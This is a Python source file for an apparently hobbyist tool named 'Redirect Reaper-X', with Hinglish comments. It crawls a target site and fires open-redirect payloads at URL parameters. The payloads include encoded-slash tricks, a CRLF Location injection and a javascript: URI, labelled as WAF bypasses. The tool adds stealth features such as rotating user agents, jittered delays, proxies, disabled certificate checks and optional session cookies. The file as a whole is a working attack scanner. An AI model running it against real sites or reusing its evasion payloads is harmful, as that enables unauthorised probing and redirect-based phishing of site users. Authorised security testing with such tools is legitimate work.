import requests
import time
import random
import concurrent.futures
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import track

# SSL Warnings disable karne ke liye
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

class RedirectReaperX:
    def __init__(self, base_url, headers=None, proxy=None, delay=0, depth=2):
        self.base_url = base_url
        self.domain = urlparse(base_url).netloc
        self.max_depth = depth
        self.delay = delay
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.visited = set()
        self.to_scan = set([base_url])
        self.vulnerabilities = []
        
        # Session & Stealth Setup
        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36"
        ]

        # Killer Bypasses from Methodology
        self.payloads = [
            "//google.com/%2f..", "/%09/google.com", "https:google.com", 
            "//google%E3%80%82com", "/%5c%5cgoogle.com", "/%0d%0aLocation: google.com",
            "javascript:alert(0)//https://google.com", "//vulnerable.com@google.com"
        ]
        self.target_params = ['url', 'next', 'redir', 'return', 'dest', 'checkout_url', 'continue']

    def stealth_request(self, url, allow_redirects=False):
        """Proxy, Delay aur Random UA ke saath request bhejta hai"""
        if self.delay > 0:
            time.sleep(self.delay + random.uniform(0.1, 0.7))
        
        headers = {'User-Agent': random.choice(self.user_agents)}
        try:
            return self.session.get(url, headers=headers, proxies=self.proxy, verify=False, timeout=10, allow_redirects=allow_redirects)
        except:
            return None

    def crawl(self, url, depth):
        """Recursive Crawler to find hidden paths"""
        if depth > self.max_depth or url in self.visited:
            return
        
        self.visited.add(url)
        resp = self.stealth_request(url, allow_redirects=True)
        if not resp or resp.status_code != 200: return

        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Links dhoondo
        for a in soup.find_all('a', href=True):
            full_url = urljoin(url, a['href']).split('#')[0]
            if urlparse(full_url).netloc == self.domain and full_url not in self.visited:
                self.to_scan.add(full_url)
                self.crawl(full_url, depth + 1)

    def attack(self, url):
        """WAF Bypass attack on each parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Agar params nahi hain toh force inject karo, warna existing par attack karo
        test_keys = list(params.keys()) if params else self.target_params
        
        for p in test_keys:
            for pay in self.payloads:
                # Parameter Pollution logic
                separator = "&" if "?" in url else "?"
                test_url = f"{url}{separator}{p}={pay}"
                
                resp = self.stealth_request(test_url, allow_redirects=False)
                if resp and resp.status_code in [301, 302, 303, 307, 308]:
                    loc = resp.headers.get("Location", "")
                    if any(x in loc.lower() for x in ["google.com", "alert"]):
                        return (test_url, resp.status_code, loc)
        return None

    def run(self):
        console.print(Panel.fit("💀 REDIRECT REAPER-X: ULTIMATE EDITION 💀", style="bold red"))
        
        console.print(f"[bold yellow][*] Starting Recursive Crawl (Depth: {self.max_depth})...[/bold yellow]")
        self.crawl(self.base_url, 0)
        
        console.print(f"[bold green][+] Discovery Done. {len(self.to_scan)} URLs to be attacked.[/bold green]")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            results = list(track(executor.map(self.attack, self.to_scan), total=len(self.to_scan), description="Bypassing WAF..."))
            for r in results:
                if r: self.vulnerabilities.append(r)
        
        self.report()

    def report(self):
        if self.vulnerabilities:
            table = Table(title="Vulnerability Report", show_lines=True)
            table.add_column("Vulnerable URL", style="cyan")
            table.add_column("Status", style="magenta")
            table.add_column("Redirect Location", style="green")

            for v in self.vulnerabilities:
                table.add_row(v[0], str(v[1]), v[2])
            
            console.print(table)
            with open("reaper_final_report.txt", "w") as f:
                for v in self.vulnerabilities:
                    f.write(f"URL: {v[0]} | Redirect: {v[2]}\n")
            console.print("[bold red]Report saved to reaper_final_report.txt[/bold red]")
        else:
            console.print("[bold green][+] No Open Redirects found.[/bold green]")

if __name__ == "__main__":
    target_url = console.input("[bold white]Target URL: [/bold white]").strip()
    
    # Auth Headers
    console.print("[dim]Format: Cookie: user=1; session=abc OR Authorization: Bearer xyz[/dim]")
    h_raw = console.input("[bold white]Headers (Optional, Enter to skip): [/bold white]").strip()
    h_dict = {h.split(':',1)[0].strip(): h.split(':',1)[1].strip() for h in h_raw.split(',') if ':' in h}

    proxy = console.input("[bold white]Proxy (e.g. http://127.0.0.1:8080) [Skip]: [/bold white]").strip()
    delay = float(console.input("[bold white]Delay in seconds (e.g. 1): [/bold white]") or 0)
    
    reaper = RedirectReaperX(target_url, headers=h_dict, proxy=proxy, delay=delay)
    reaper.run()